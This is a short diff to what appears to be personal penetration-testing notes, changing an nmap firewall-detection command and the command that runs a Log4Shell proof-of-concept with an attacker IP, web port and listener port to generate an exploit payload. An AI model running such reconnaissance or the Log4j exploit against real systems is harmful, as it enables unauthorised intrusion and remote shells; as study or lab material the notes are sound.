@@ -98,7 +98,7 @@ nmap --script=http-trace -d <target-domain>
 OR 
 we can also detect [[Firewall]] using nmap too
 ```bash
-nmap -p80 --script=http-waf-detect <target-domain>
+nmap -p80 --script=http-waf-detect -d <target-domain>
 ```
 ---
 
@@ -221,7 +221,7 @@ cd log4j-shell-poc
 
 now in the Attacker another terminal
  ```bash
- python3 poc.py -userip 10.10.1.13 --webport 8000 --lport 9001
+ python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
  ```
  > a payload will be generated in the `send me:` section
  > copy the payload
